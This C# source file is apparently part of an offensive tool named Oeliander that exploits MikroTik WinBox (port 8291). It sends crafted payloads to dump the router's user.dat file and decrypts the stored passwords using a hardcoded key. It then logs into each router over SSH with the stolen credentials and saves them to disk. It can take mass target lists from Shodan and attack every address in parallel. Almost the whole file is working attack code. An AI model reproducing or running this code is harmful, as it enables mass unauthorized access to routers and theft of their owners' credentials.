using Microsoft.VisualBasic.ApplicationServices;
using Renci.SshNet;
using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using static System.Net.Mime.MediaTypeNames;
using static Oeliander.MainWindow;

namespace Oeliander
{
    public class newHelper
    {
        #region Locals

        public int inheritance = 0;
        public MainWindow mainFormObject { get; set; }
        private Action<string, object> logger { get; set; }
        private List<string> errorList = new List<string>();
        private bool loggerInvoke { get; set; }
        private string resultPath { get; set; }
        private readonly object locker = new object();
        public bool debugMod = false;
        public bool working = false;
        private readonly Stopwatch timer = new Stopwatch();

        private readonly ReaderWriterLockSlim _readWriteLock = new ReaderWriterLockSlim();

        #endregion Locals

        public static string DecryptionKey = "283i4jfkai3389";
        public static int BufferSize = 1024;

        public List<User> GetUsers(string ip, int port = 8291)
        {
            IPAddress addr = null;
            try { addr = IPAddress.Parse(ip); } catch 
            {
                mainFormObject.Dispatcher.Invoke(() =>
                {
                    mainFormObject.addLog($"[-] '{ip}' is not a valid IP!");
                });
                Console.WriteLine($"'{ip}' is not a valid IP!"); return null; 
            }

            byte[] ResponseBytes = new byte[BufferSize];
            using (Socket Socket = new Socket(addr.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
            {
                Socket.ReceiveTimeout = Convert.ToInt32(_Settings.settings.Connection_Timeout);
                Socket.SendTimeout = Convert.ToInt32(_Settings.settings.Connection_Timeout);

                try { Socket.Connect(new IPEndPoint(addr, port)); }
                catch (SocketException ex) 
                {
                    mainFormObject.Dispatcher.Invoke(() =>
                    {
                        mainFormObject.addLog($"[-] {ip}: Timed out! {ex.Message}");
                    });
                    Console.WriteLine($"{ip}: Timed out!"); return null; 
                }
                catch (Exception ex) 
                {
                    mainFormObject.Dispatcher.Invoke(() =>
                    {
                        mainFormObject.addLog($"[-] {ip}: Unknown error: {ex.Message}");
                    });
                    Console.WriteLine($"{ip}: Unknown error: {ex.Message}"); return null;
                }

                Socket.Send(Payloads.Hello_Payload);

                ResponseBytes = new byte[BufferSize];
                try { Socket.Receive(ResponseBytes, BufferSize, SocketFlags.None); }
                catch (SocketException ex) 
                {
                    mainFormObject.Dispatcher.Invoke(() =>
                    {
                        mainFormObject.addLog($"[-] {ip}: {ex.Message}");
                    });
                    Console.WriteLine($"{ip}: {ex.Message}"); return null; 
                }

                // inject session id into dump payload
                byte[] DumpPayload = Payloads.UserDatPayload;
                DumpPayload[19] = ResponseBytes[38];
                Socket.Send(DumpPayload); // send malicious payload

                ResponseBytes = new byte[BufferSize];
                Socket.Receive(ResponseBytes, BufferSize, SocketFlags.None); // receive byte array of user.dat
            }

            ResponseBytes = ResponseBytes.Skip(55).ToArray(); // remove header
            List<byte[]> ByteUsersList = ResponseBytes.Split(new byte[] { 0xff }).Skip(1).ToList(); // split user.dat up by user list

            List<User> Users = new List<User>();
            foreach (byte[] dumpeduser in ByteUsersList) // loop all dumped users
            {
                try
                {
                    byte[] usernameArray = dumpeduser.Split(new byte[] { 0x01, 0x00, 0x00, 0x21 })[1];
                    byte[] passwordArray = dumpeduser.Split(new byte[] { 0x11, 0x00, 0x00, 0x21 })[1];

                    byte[] usernameBytes = usernameArray.Skip(1).Take(usernameArray[0]).ToArray();
                    byte[] passwordBytes = passwordArray.Skip(1).Take(usernameArray[0]).ToArray();

                    byte[] KeyBytes = usernameBytes.Concat(Encoding.ASCII.GetBytes(DecryptionKey)).ToArray();
                    byte[] Key = MD5.Create().ComputeHash(KeyBytes);

                    string password = "";
                    for (int i = 0; i < passwordBytes.Length; i++)
                        password += (char)(passwordBytes[i] ^ Key[i % Key.Length]);

                    Users.Add(new User(Encoding.ASCII.GetString(usernameBytes), password));
                }
                catch { }
            }

            return Users;
        }

        public void TryInfect(string ip, User user)
        {
            SSH ssh = new SSH(ip, user.Username, user.Password);
            if (ssh.TryConnect())
            {
                ssh.SendCMD("whoami");
                mainFormObject.Dispatcher.Invoke(() =>
                {
                    mainFormObject.addLog($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}" + Environment.NewLine);
                });
                Console.WriteLine($"SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
            }
        }

        public void addLog(string text, object dataTwo = null)
        {
            try
            {
                text = "[" + DateTime.Now.ToString("G") + "] - " + text + "";
                if (dataTwo != null)
                {
                    mainFormObject.Dispatcher.Invoke(() =>
                    {
                        mainFormObject.addLog(text + " " + Convert.ToString(dataTwo));
                    });
                    logger(text, dataTwo);
                }
                else
                {
                    mainFormObject.Dispatcher.Invoke(() =>
                    {
                    mainFormObject.addLog(text);// + Environment.NewLine);
                    });
                    logger(text, null);
                }
            }
            catch (Exception E)
            {
                HandleException(E);
            }
        }

        public void createResultPath()
        {
            try
            {
                string name = DateTime.Now.ToString("g");
                name = name.Replace("/", "-").Replace(":", "-");
                if (!Directory.Exists($"Result-Vulnerable"))
                {
                    Directory.CreateDirectory($"Result-Vulnerable");
                }
                if (!Directory.Exists($@"Result-Vulnerable\{name}"))
                {
                    Directory.CreateDirectory($@"Result-Vulnerable\{name}");
                }
                resultPath = $@"Result-Vulnerable\{name}";
                if (debugMod)
                {
                    addLog(resultPath);
                }
            }
            catch (Exception E)
            {
                HandleException(E);
            }
        }

        public void Save(string data, string type)
        {
            _readWriteLock.EnterWriteLock();
            try
            {
                resultPath = Directory.GetCurrentDirectory() + "\\Results";
                if (!Directory.Exists(resultPath))
                {
                    Directory.CreateDirectory(resultPath);
                }
                if (!Directory.Exists($@"{resultPath}\WinBox"))
                {
                    Directory.CreateDirectory($@"{resultPath}\WinBox");
                }
                string fileNM = $@"{resultPath}\WinBox\{type}.txt";
                using (StreamWriter st = File.AppendText(fileNM))
                {
                    st.WriteLine(data);
                }
            }
            finally
            {
                _readWriteLock.ExitWriteLock();
            }
        }

        public void HandleException(Exception E)
        {
            if (debugMod)
            {
                StackTrace trace = new StackTrace(E, true);
                string data = trace.GetFrame(0).GetFileLineNumber().ToString() + ": " + E.Message;
                if (!errorList.Contains(data))
                {
                    errorList.Add(data);
                    addLog(data);
                    Save(data, "Error");
                }
            }
        }
        public static string _using;
        private List<User> usersList;
        private void TryExploit(string target)
        {
            usersList = new List<User>();
            try
            {
                if (target.EndsWith(".txt"))
                {
                    string[] _ip = File.ReadAllLines(target);
                    foreach (string _tar in _ip)
                    {
                        usersList = GetUsers(_tar);
                        mainFormObject.Dispatcher.Invoke(() =>
                        {
                            mainFormObject.addCred(usersList, _tar);
                        });
                        if (usersList != null && usersList.Count > 0)
                        {
                            List<Thread> sshThreads = new List<Thread>();
                            foreach (User user in usersList)
                            {
                                mainFormObject.Dispatcher.Invoke(() =>
                                {
                                    mainFormObject.addLog($"[!] Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");// + Environment.NewLine);
                                });
                                Save($"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}", "SaveList");
                                Console.WriteLine($"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}", "Complete");
                                sshThreads.Add(new Thread(() => TryInfect(_tar, user)));
                            }

                            foreach (User user in usersList)
                            {
                                mainFormObject.Dispatcher.Invoke(() =>
                                {
                                    mainFormObject.addLog($"[?] Attempting to SSH into '{user.Username}@{_tar}' using password: {user.Password}");// + Environment.NewLine);
                                });
                                string _1 = $"Attempting to SSH into '{user.Username}@{_tar}' using password: {user.Password}";
                                Save(_1, "List");
                                Console.WriteLine(_1);
                            }
                            Parallel.ForEach(sshThreads, thread =>
                            {
                                thread.Start();
                                thread.Join();
                            });
                            Console.WriteLine("#############################");
                            foreach (CollectionListing _cred in _collectionList)
                                Save(_cred.item + " " + _cred.Username.PadRight(32) + _cred.Password.PadRight(32) + _cred.IPAddress, "Credentials");

                        }
                        else
                        {
                            mainFormObject.Dispatcher.Invoke(() =>
                            {
                                mainFormObject.addLog("[!] Exploit Failed: Target might not be vulnerable!");// + Environment.NewLine);
                            });
                            Console.WriteLine("Exploit Failed: Target might not be vulnerable!");
                        }
                    }
                }
                else
                { 
                    List<User> users = GetUsers(target);
                    if (users != null && users.Count > 0)
                    {
                        List<Thread> sshThreads = new List<Thread>();
                        foreach (User user in users)
                        {

                            mainFormObject.Dispatcher.Invoke(() =>
                            {
                                //mainFormObject.addCred(users, target);
                                mainFormObject.addLog($"[+] Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");// + Environment.NewLine);
                            });
                            string _1 = $"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}";
                            Save(_1, "Saved");
                            Console.WriteLine(_1);
                            Thread.Sleep(3000);
                            sshThreads.Add(new Thread(() => TryInfect(target, user)));
                            Thread.Sleep(3000);
                        }

                        foreach (User user in users)
                        {
                            mainFormObject.Dispatcher.Invoke(() =>
                            {
                                mainFormObject.addCred(users, target);
                                mainFormObject.addLog($"[?] Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");// + Environment.NewLine);
                            });
                            Console.WriteLine($"Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");
                        }
                        Parallel.ForEach(sshThreads, thread =>
                        {
                            thread.Start();
                            thread.Join();
                        });
                        Console.WriteLine("#############################");
                    }
                    else {
                        mainFormObject.Dispatcher.Invoke(() =>
                        {
                            mainFormObject.addLog("[!] Exploit Failed: Target might not be vulnerable!");// + Environment.NewLine);
                        });
                        Console.WriteLine("Exploit Failed: Target might not be vulnerable!"); 
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message.ToString());
                Console.ReadLine();
            }
        }

        public static ShodanResponse _results;
        public static string _osVersion;
        public string _use;
        public void Start(bool usingShodan, string _intTarget)
        {
            _using = _osVersion = _intTarget;
            try
            {
                working = true;
                if (usingShodan)
                {
                    Thread st = new Thread(ShodanScanner.GetShodanSearch);
                    st.Start();
                    do
                        Thread.Sleep(5000);
                    while (st.IsAlive);
                    if (ShodanScanner._continue)
                    {
                        _results = ShodanScanner.sr;
                        mainFormObject.Dispatcher.Invoke(() =>
                        {
                            mainFormObject.addTargetNum(_results.matches.Count);
                            mainFormObject.addLog("[*] Found " + _results.matches.Count + " target IP's");// + Environment.NewLine);
                        });
                        Console.WriteLine("Found " + _results.matches.Count + " IP's");
                        foreach (Match m in _results.matches)
                        {
                            mainFormObject.Dispatcher.Invoke(() =>
                            {
                                mainFormObject.addLog($"[?] Attempting: {m.ip_str}");// + Environment.NewLine);
                            });
                            Console.WriteLine($"Attempting: {m.ip_str}");
                            _using = m.ip_str;
                            _use = m.ip_str;
                            Thread tr = new Thread(() => TryExploit(m.ip_str));
                            tr.Start();
                            //tr.Join();
                        }
                    }
                }
                else
                {
                    string _;
                    if (_using.EndsWith(".txt"))
                        _ = $"IPList: {_intTarget}";
                    else
                        _ = $"IP: {_intTarget}";
                    mainFormObject.Dispatcher.Invoke(() =>
                    {
                        mainFormObject.addLog($"[?] Attempting to exploit provided {_}");// + Environment.NewLine);
                    });
                    Thread tr = new Thread(() => TryExploit(_intTarget));
                    tr.Start();
                    //tr.Join();
                }
            }
            catch (Exception E)
            {
                HandleException(E);
            }
        }
        public newHelper(Action<string, object> objLogger, bool needInvoke, MainWindow main)
        {
            mainFormObject = main;
            logger = objLogger;
            loggerInvoke = needInvoke;
           // addLog("initialization successed");
        }
    }
}